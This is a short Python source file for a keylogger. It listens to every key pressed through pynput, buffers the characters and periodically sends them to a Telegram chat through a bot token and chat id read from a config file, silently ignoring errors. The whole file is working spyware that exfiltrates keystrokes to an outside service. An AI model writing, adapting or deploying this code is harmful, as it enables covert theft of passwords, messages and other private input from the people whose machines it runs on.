from pynput import keyboard
import telepot
import threading
import time
import json

with open('config.json') as file:
    data = json.load(file)

bot = telepot.Bot(data['bot_token']);

keys = []

def send_to_telegram(key):
    try:
        bot.sendMessage(data['chat_id'],str(key))
    except:
        pass

def format_text(keys):
    text = ''.join(keys)
    return text

def on_press(key):
    try:
        key_str = str(key.char)
        keys.append(key_str)
    except AttributeError:
        keys.append(' ')


        
def send_keys():
    global keys
    if keys:
        text = format_text(keys)
        send_to_telegram(text)
        keys = []
    threading.Timer(data['timer'],send_keys).start()

with keyboard.Listener(on_press = on_press) as listener:
    # listener.start()
    threading.Timer(int(data['timer']),send_keys).start()
    listener.join()
    
